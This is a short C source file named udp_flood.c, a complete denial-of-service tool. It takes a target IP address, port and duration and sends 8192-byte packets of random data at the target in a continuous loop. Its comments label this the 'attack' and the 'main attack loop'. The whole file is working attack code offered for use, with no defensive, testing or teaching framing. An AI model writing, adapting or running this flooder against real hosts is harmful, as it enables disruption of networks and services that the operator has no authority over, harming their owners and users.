// udp_flood.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define PACKET_SIZE 8192  // Size of each UDP packet (can be adjusted)

// Generate random data to fill the UDP packet
void generate_packet(char *packet, int size) {
    for (int i = 0; i < size; ++i) {
        packet[i] = rand() % 256;  // Random byte values from 0 to 255
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <duration_seconds>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Target address setup
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid target IP address");
        return 1;
    }

    // Allocate memory for the UDP packet
    char packet[PACKET_SIZE];

    printf("Starting UDP flood on %s:%d for %d seconds...\n", target_ip, target_port, duration);

    // Start the attack timer
    time_t start_time = time(NULL);

    // Main attack loop
    while (time(NULL) - start_time < duration) {
        generate_packet(packet, PACKET_SIZE);

        // Send the packet to the target
        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Packet send failed");
            break;
        }
    }

    printf("Attack finished.\n");

    // Close the socket
    close(sock);
    return 0;
}
